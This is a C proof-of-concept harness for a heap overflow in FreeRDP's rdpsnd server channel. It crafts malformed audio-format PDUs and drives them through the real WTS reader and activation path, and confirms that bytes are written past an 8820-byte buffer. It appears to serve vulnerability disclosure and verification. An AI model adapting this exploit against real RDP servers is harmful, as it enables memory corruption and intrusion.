/*
 * PocRdpsndRealWts.c — two framed SNDC_FORMATS PDUs through FreeRDP's REAL
 * server-side WTS virtual-channel reader and the real shadow activation path.
 *
 * Difference from PocRdpsndChannelDispatch.c: that PoC replaced
 * pVirtualChannelRead with a scripted in-memory callback and called SelectFormat
 * by hand. Here FreeRDP's own WTS table supplies the reader and the real
 * shadow activation callback selects the format.
 * PDU 1 is a benign PCM record (allocates the 8820-byte buffer); PDU 2 is the
 * WAVE_FORMAT_DVI_ADPCM record with nBlockAlign=4, nChannels=2 (the advisory's
 * primitive), or the WAVE_FORMAT_ADPCM record with nBlockAlign=8, nChannels=2.
 * The parser floor passes; the codec-consistency relation is unchecked and the
 * bs expression wraps, failing the realloc and leaving out_frames wrapped.
 * Two SendSamples calls then write chosen markers past the 8820-byte buffer.
 *
 * CODEC-GATING CONDITION (measured 2026-11-21): server_rdpsnd_get_formats()
 * filters the default list through freerdp_dsp_supports_format(). With
 * WITH_FFMPEG=OFF and WITH_DSP_EXPERIMENTAL=OFF the list contains PCM only, so
 * real activation REJECTS both wrap-capable records. With WITH_DSP_EXPERIMENTAL
 * ON, DVI_ADPCM is supported and ADPCM explicitly is not. A FFmpeg-enabled
 * build maps both tags to ADPCM codecs. The real activation path therefore
 * depends on build configuration; this PoC prints the actual server list.
 *
 * STILL UNKNOWN / NOT PROVEN HERE: no RDP session, no real network transport,
 * no auth gate, no stock heap grooming. The queue is fed directly in-process;
 * only the WTS reader and the activation logic are the real FreeRDP code.
 * Default posture is post-auth (PR:L, CVSS 8.8); 9.8 only for no-auth.
 *
 * Usage: PocRdpsndRealWts [dvi|adpcm|benign]. Default is dvi.
 */
#include <freerdp/codec/audio.h>
#include <freerdp/channels/channels.h>
#include <freerdp/server/server-common.h>
#include <winpr/stream.h>
#include <winpr/wtsapi.h>
#include <winpr/collections.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };
static BYTE dvi_ext[2] = { 0xf9, 0x07 };
static AUDIO_FORMAT fmt_dvi = { WAVE_FORMAT_DVI_ADPCM, 2, 44100, 44251, 4, 4, 2, dvi_ext };
static AUDIO_FORMAT fmt_adpcm = { WAVE_FORMAT_ADPCM, 2, 44100, 176400, 8, 16, 0, NULL };

/* Server-format table a shadow audio subsystem may supply via
 * subsystem->rdpsndFormats (shadow_rdpsnd.c:67-71). No in-tree subsystem does;
 * this mode shows the real activation path when the tag is offered. */
static AUDIO_FORMAT subsystem_formats[2] = {
	{ WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL },
	{ WAVE_FORMAT_ADPCM, 2, 44100, 176400, 4, 16, 0, NULL }
};
/* Real 3.32.0 server source: static parser, dispatcher, select and send. */
#include "rdpsnd_main.c"

#define CALL_BYTES 16384u
#define WATCH1 8820u
#define WATCH2 (CALL_BYTES + 5000u)

/* Layout-compatible prefix of libfreerdp/core/server.h struct rdp_peer_channel.
 * FreeRDP_WTSVirtualChannelRead (server.c:1702-1747) only dereferences
 * ->queue; the remaining fields mirror the real struct up to that member. */
typedef struct
{
	void* vcm;
	void* client;
	void* extra;
	UINT16 index;
	UINT32 channelId;
	UINT16 channelType;
	UINT32 channelFlags;
	wStream* receiveData;
	wMessageQueue* queue;
} TestPeerChannel;

/* libfreerdp/core/server.c:59-65 wtsChannelMessage. */
typedef struct
{
	UINT16 channelId;
	UINT16 reserved;
	UINT32 length;
	UINT32 offset;
} TestWtsMessage;

static TestPeerChannel g_channel;
static wMessageQueue* g_queue;

static void free_queued_message(void* obj)
{
	wMessage* msg = (wMessage*)obj;
	if (msg)
	{
		free(msg->context);
		msg->context = NULL;
	}
}

/* Same shape as libfreerdp's static wts_queue_receive_data() (server.c:79-107). */
static BOOL post_pdu(const BYTE* data, size_t len)
{
	TestWtsMessage* m = (TestWtsMessage*)malloc(sizeof(*m) + len);
	if (!m)
		return FALSE;
	memset(m, 0, sizeof(*m));
	m->length = (UINT32)len;
	memcpy(m + 1, data, len);
	return MessageQueue_Post(g_queue, m, 0, NULL, NULL);
}

static void frame_pdu(BYTE* wire, size_t* wire_len, const AUDIO_FORMAT* fmt)
{
	wStream* s = Stream_New(wire, 256);
	size_t total = 0;

	Stream_Write_UINT8(s, SNDC_FORMATS);
	Stream_Write_UINT8(s, 0);
	Stream_Write_UINT16(s, 0); /* patched below */

	Stream_Write_UINT32(s, 0);          /* dwFlags */
	Stream_Write_UINT32(s, 0xffffffff); /* dwVolume */
	Stream_Write_UINT32(s, 0);          /* dwPitch */
	Stream_Write_UINT16(s, 0);          /* wDGramPort */
	Stream_Write_UINT16(s, 1);          /* nformats: one record per PDU */
	Stream_Write_UINT8(s, 0);           /* cLastBlockConfirmed */
	Stream_Write_UINT16(s, 1);          /* wVersion */
	Stream_Write_UINT8(s, 0);           /* bPad */
	audio_format_write(s, fmt);

	total = Stream_GetPosition(s);
	Stream_SetPosition(s, 2);
	Stream_Write_UINT16(s, (UINT16)(total - 4));
	Stream_Free(s, FALSE);
	*wire_len = total;
}

/* shadow_rdpsnd.c:35-53 rdpsnd_activated(), reproduced verbatim in logic. */
static void shadow_activated(RdpsndServerContext* context)
{
	for (size_t i = 0; i < context->num_client_formats; i++)
	{
		for (size_t j = 0; j < context->num_server_formats; j++)
		{
			if (audio_format_compatible(&context->server_formats[j], &context->client_formats[i]))
			{
				const UINT rc = context->SelectFormat(context, (UINT16)i);
				printf("[activate] shadow selected client format %u rc=%u\n", (unsigned)i, rc);
				return;
			}
		}
	}
	printf("[activate] no compatible server format\n");
}

int main(int argc, char** argv)
{
	const char* mode = (argc >= 2) ? argv[1] : "dvi";
	const int benign = (strcmp(mode, "benign") == 0);
	const int subsystem = (strcmp(mode, "subsystem") == 0);
	const int use_dvi = !subsystem && !benign && (strcmp(mode, "adpcm") != 0);
	const AUDIO_FORMAT* bad = (use_dvi || benign) ? &fmt_dvi : &fmt_adpcm;
	const size_t expected_frames = use_dvi ? (size_t)-16 : (size_t)-4;
	BYTE wire1[256], wire2[256];
	size_t len1 = 0, len2 = 0;
	RdpsndServerContext* ctx = NULL;
	volatile BYTE* out = NULL;
	BYTE *b1 = NULL, *b2 = NULL;
	UINT rc[4] = { 0 };
	BYTE inb = 0, m1 = 0, m2 = 0;
	size_t size_after_pdu1 = 0;
	int ok = 1;

	setvbuf(stdout, NULL, _IONBF, 0);

	wObject cb;
	memset(&cb, 0, sizeof(cb));
	cb.fnObjectFree = free_queued_message;
	g_queue = MessageQueue_New(&cb);
	memset(&g_channel, 0, sizeof(g_channel));
	g_channel.queue = g_queue;
	if (!g_queue)
		return 2;

	/* Real FreeRDP WTS table: pVirtualChannelRead == FreeRDP_WTSVirtualChannelRead. */
	if (!WTSRegisterWtsApiFunctionTable(FreeRDP_InitWtsApi()))
	{
		printf("[realwts] real WTS table registration failed\n");
		return 2;
	}

	ctx = rdpsnd_server_context_new(NULL);
	if (!ctx)
		return 2;
	ctx->priv->ChannelHandle = (HANDLE)&g_channel;
	ctx->priv->SessionId = WTS_CURRENT_SESSION;
	ctx->latency = 50;
	ctx->num_server_formats = server_rdpsnd_get_formats(&ctx->server_formats);
	if (subsystem)
	{
		ctx->server_formats = subsystem_formats;
		ctx->num_server_formats = 2;
	}
	printf("server format source: %s\n",
	       subsystem ? "harness-supplied subsystem table" : "real server_rdpsnd_get_formats()");
	printf("real server formats:");

	for (size_t k = 0; k < ctx->num_server_formats; k++)
		printf(" %u", ctx->server_formats[k].wFormatTag);
	printf("\n");
	ctx->src_format = &ctx->server_formats[0]; /* shadow_rdpsnd.c:78 */
	ctx->Activated = shadow_activated;
	InitializeCriticalSectionAndSpinCount(&ctx->priv->lock, 4000);

	frame_pdu(wire1, &len1, &fmt_pcm);
	frame_pdu(wire2, &len2, benign ? &fmt_pcm : bad);
	if (!post_pdu(wire1, len1) || !post_pdu(wire2, len2))
		return 2;

	/* Each framed PDU takes two reads: 4-byte header, then the body. */
	for (int i = 0; i < 4; i++)
	{
		rc[i] = rdpsnd_server_handle_messages(ctx);
		if (i == 1)
			size_after_pdu1 = ctx->priv->out_buffer_size;
	}

	printf("real-WTS reads rc=%u,%u,%u,%u selected=%u nformats=%u tag=%u ch=%u align=%u\n", rc[0],
	       rc[1], rc[2], rc[3], ctx->selected_client_format, ctx->num_client_formats,
	       ctx->client_formats[0].wFormatTag, ctx->client_formats[0].nChannels,
	       ctx->client_formats[0].nBlockAlign);
	printf("out_buffer_size after PDU1=%zu final out_frames=0x%016zx out_buffer_size=%zu\n",
	       size_after_pdu1, ctx->priv->out_frames, ctx->priv->out_buffer_size);

	if (rc[0] != CHANNEL_RC_OK || rc[1] != CHANNEL_RC_OK || rc[2] != CHANNEL_RC_OK ||
	    rc[3] != CHANNEL_RC_OK || size_after_pdu1 != 8820)
	{
		ok = 0;
		goto done;
	}
	if (benign)
	{
		ok = (ctx->priv->out_frames == 0x89d && ctx->priv->out_buffer_size == 8820);
		goto done;
	}
	if (ctx->num_client_formats != 1 || ctx->client_formats[0].wFormatTag != bad->wFormatTag ||
	    ctx->client_formats[0].nBlockAlign != bad->nBlockAlign ||
	    ctx->priv->out_frames != expected_frames || ctx->priv->out_buffer_size != 8820)
	{
		ok = 0;
		goto done;
	}

	out = (volatile BYTE*)ctx->priv->out_buffer;
	b1 = (BYTE*)malloc(CALL_BYTES);
	b2 = (BYTE*)malloc(CALL_BYTES);
	memset(b1, 0x11, CALL_BYTES);
	memset(b2, 0x22, CALL_BYTES);
	b1[WATCH1] = 0xDE;
	b2[WATCH2 - CALL_BYTES] = 0xAD;
	ctx->SendSamples(ctx, b1, 4096, 0);
	ctx->SendSamples(ctx, b2, 4096, 0);
	inb = out[8819];
	m1 = out[WATCH1];
	m2 = out[WATCH2];
	printf("readback offset 8819=%02x offset 8820=%02x offset 21384=%02x "
	       "out_pending_frames=%zu\n",
	       inb, m1, m2, ctx->priv->out_pending_frames);
	ok = (inb == 0x11) && (m1 == 0xDE) && (m2 == 0xAD) &&
	     (ctx->priv->out_pending_frames == 8192);

done:
	printf("[realwts] mode=%s %s RESULT=%s\n", mode, benign ? "benign" : "chosen",
	       ok ? "PASS" : "FAIL");
	fflush(stdout);
	_exit(ok ? 0 : 1);
}
